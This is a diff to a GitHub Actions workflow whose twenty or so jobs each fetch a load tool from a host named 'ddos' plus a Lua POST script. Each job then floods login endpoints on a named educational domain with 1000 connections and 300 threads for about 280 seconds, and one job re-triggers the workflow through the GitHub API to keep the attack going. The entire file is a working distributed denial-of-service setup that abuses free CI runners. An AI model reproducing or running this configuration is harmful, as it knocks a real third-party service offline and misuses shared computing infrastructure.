@@ -1,4 +1,4 @@
-ame: CI
+name: CI
 
 on:
   push:
@@ -15,8 +15,11 @@ jobs:
       - name: Run a multi-line script
         run: |
           wget https://ddos.nms.workers.dev/wrk
+                  chmod 777 wrk
           ./wrk -c1000 -t300 -d280s http://wy.targetedu.cn:9999/login/verify/0.6069696256114081
           curl -X POST -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github.v3+json" -d '{"ref": "main"}' https://api.github.com/repos/niniubiwoc/run-script-action/actions/workflows/blank.yml/dispatches
+
+
   build2:
     runs-on: ubuntu-latest
     steps:
@@ -25,7 +28,9 @@ jobs:
         run: |
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
-          ./wrk -c1000 -t300 -d280s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+
+
   build3:
     runs-on: ubuntu-latest
     steps:
@@ -34,7 +39,9 @@ jobs:
         run: |
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
-          ./wrk -c1000 -t300 -d280s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+
+
   build4:
     runs-on: ubuntu-latest
     steps:
@@ -43,7 +50,9 @@ jobs:
         run: |
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
-          ./wrk -c1000 -t300 -d280s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+
+
   build5:
     runs-on: ubuntu-latest
     steps:
@@ -52,7 +61,9 @@ jobs:
         run: |
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
-          ./wrk -c1000 -t300 -d280s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+
+
   build6:
     runs-on: ubuntu-latest
     steps:
@@ -61,7 +72,9 @@ jobs:
         run: |
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
-          ./wrk -c1000 -t300 -d280s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+
+
   build7:
     runs-on: ubuntu-latest
     steps:
@@ -70,7 +83,9 @@ jobs:
         run: |
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
-          ./wrk -c1000 -t300 -d280s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+
+
   build8:
     runs-on: ubuntu-latest
     steps:
@@ -79,7 +94,9 @@ jobs:
         run: |
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
-          ./wrk -c1000 -t300 -d280s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+
+
   build9:
     runs-on: ubuntu-latest
     steps:
@@ -88,7 +105,9 @@ jobs:
         run: |
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
-          ./wrk -c1000 -t300 -d280s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+
+
   build10:
     runs-on: ubuntu-latest
     steps:
@@ -97,7 +116,9 @@ jobs:
         run: |
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
-          ./wrk -c1000 -t300 -d280s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+
+
   build11:
     runs-on: ubuntu-latest
     steps:
@@ -106,7 +127,9 @@ jobs:
         run: |
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
-          ./wrk -c1000 -t300 -d280s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+
+
   build12:
     runs-on: ubuntu-latest
     steps:
@@ -115,7 +138,9 @@ jobs:
         run: |
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
-          ./wrk -c1000 -t300 -d280s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+
+
   build13:
     runs-on: ubuntu-latest
     steps:
@@ -124,7 +149,9 @@ jobs:
         run: |
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
-          ./wrk -c1000 -t300 -d280s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+
+
   build14:
     runs-on: ubuntu-latest
     steps:
@@ -133,7 +160,9 @@ jobs:
         run: |
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
-          ./wrk -c1000 -t300 -d280s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+
+
   build15:
     runs-on: ubuntu-latest
     steps:
@@ -142,7 +171,9 @@ jobs:
         run: |
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
-          ./wrk -c1000 -t300 -d280s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+
+
   build16:
     runs-on: ubuntu-latest
     steps:
@@ -151,7 +182,9 @@ jobs:
         run: |
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
-          ./wrk -c1000 -t300 -d280s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+
+
   build17:
     runs-on: ubuntu-latest
     steps:
@@ -160,7 +193,9 @@ jobs:
         run: |
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
-          ./wrk -c1000 -t300 -d280s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+
+
   build18:
     runs-on: ubuntu-latest
     steps:
@@ -169,7 +204,9 @@ jobs:
         run: |
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
-          ./wrk -c1000 -t300 -d280s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+
+
   build19:
     runs-on: ubuntu-latest
     steps:
@@ -178,7 +215,9 @@ jobs:
         run: |
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
-          ./wrk -c1000 -t300 -d280s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+
+
   build20:
     runs-on: ubuntu-latest
     steps:
@@ -187,4 +226,4 @@ jobs:
         run: |
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
-          ./wrk -c1000 -t300 -d280s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
